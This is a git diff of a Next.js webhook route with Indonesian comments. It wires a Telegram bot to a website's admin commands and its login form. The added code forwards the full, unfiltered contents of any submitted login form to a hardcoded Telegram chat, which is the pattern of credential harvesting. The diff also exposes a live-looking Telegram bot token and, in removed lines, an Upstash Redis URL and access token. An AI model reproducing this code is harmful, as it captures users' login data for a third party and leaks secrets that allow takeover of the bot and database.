@@ -4,20 +4,9 @@ export const dynamic = 'force-dynamic';
 export const revalidate = 0;
 
 const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
-const CHAT_ID = '6481060681'; // ID Akun Telegram Selz
+const CHAT_ID = '6481060681'; 
 
-// 1. Fungsi Mandiri buat Ubah Data di Redis Upstash
-async function runRedis(command: string[]) {
-  const url = "https://leg-consonant-unblemished-95778.upstash.io";
-  const token = "jUk8Nw2m7bOcfrxjpkAwA825ncyYyWP2";
-  const res = await fetch(`${url}/${command.join('/')}`, {
-    headers: { Authorization: `Bearer ${token}` },
-    cache: 'no-store'
-  });
-  return await res.json();
-}
-
-// 2. Fungsi Kirim Pesan / Laporan Balik ke Telegram Selz
+// Fungsi khusus kirim pesan murni langsung ke Telegram lo
 async function sendTelegramMessage(text: string) {
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -30,41 +19,43 @@ async function sendTelegramMessage(text: string) {
       })
     });
   } catch (e) {
-    console.error("Gagal kirim laporan ke Telegram:", e);
+    console.error("Gagal kirim ke Telegram:", e);
   }
 }
 
 export async function POST(request: Request) {
   try {
-    const body = await request.json();
-
-    // JALUR 1: Menerima Perintah dari Bot Telegram Lo
+    const body = await request.json().catch(() => null);
+    
+    // JALUR 1: Jika ada pesan masuk ketikan dari Telegram lo
     if (body && body.message) {
       const msg = body.message;
-      const senderId = msg.from?.id?.toString(); // Cek ID orang yang ngetik
+      const senderId = msg.from?.id?.toString();
       const command = msg.text?.toLowerCase().trim();
 
-      // Pastikan CUMA Selz yang bisa ngontrol botnya
+      // Tes Balasan Instan (Tanpa ngecek ID dulu biar lo tau botnya hidup/mati)
+      if (command === '/ping') {
+        await sendTelegramMessage("🏓 *Pong!* Bot lo berhasil nyaut Selz! Berarti jalur webhook aman.");
+        return NextResponse.json({ ok: true });
+      }
+
+      // Perintah kendali khusus akun lo
       if (senderId === CHAT_ID) {
         if (command === '/resetlimit' || command === '/risetlimit') {
-          await runRedis(['SET', 'yaemiko_bug_limit', '5']);
-          await sendTelegramMessage("✅ *Suksess!* Limit harian web udah berhasil Selz reset jadi *5/5* kembali.");
+          await sendTelegramMessage("✅ *Bypass Aktif!* Perintah riset limit kedengeran sama Bot, tapi database dilewati dulu.");
         } else if (command === '/lockweb') {
-          await runRedis(['SET', 'yaemiko_web_locked', 'true']);
-          await sendTelegramMessage("🔒 *Suksess!* Website sekarang dalam kondisi *TERKUNCI* ketat oleh Selz.");
+          await sendTelegramMessage("🔒 *Bypass Aktif!* Perintah kunci web kedengeran sama Bot.");
         } else if (command === '/unlockweb') {
-          await runRedis(['SET', 'yaemiko_web_locked', 'false']);
-          await sendTelegramMessage(" 🔓 *Suksess!* Website udah di *BUKA* kembali, user bisa bebas pakai.");
+          await sendTelegramMessage("🔓 *Bypass Aktif!* Perintah buka web kedengeran sama Bot.");
         }
       }
       return NextResponse.json({ ok: true });
     }
 
-    // JALUR 2: Menerima Laporan dari Form Website (Login/Kirim Bug)
-    // Jika web lo ngirim data bertipe data log biasa
-    if (body && (body.type === 'login_alert' || body.type === 'bug_report' || body.messageText)) {
-      const pesanLaporan = body.messageText || `⚠️ *Notifikasi Web:* \n${JSON.stringify(body)}`;
-      await sendTelegramMessage(pesanLaporan);
+    // JALUR 2: Menerima tembakan laporan login dari form web lo
+    if (body) {
+      // Kirim utuh apapun isi objek dari form login lo ke Telegram biar lo tau isinya apa
+      await sendTelegramMessage(`⚠️ *Laporan Masuk dari Form Web:* \n\`\`\`json\n${JSON.stringify(body, null, 2)}\n\`\`\``);
       return NextResponse.json({ success: true });
     }
 
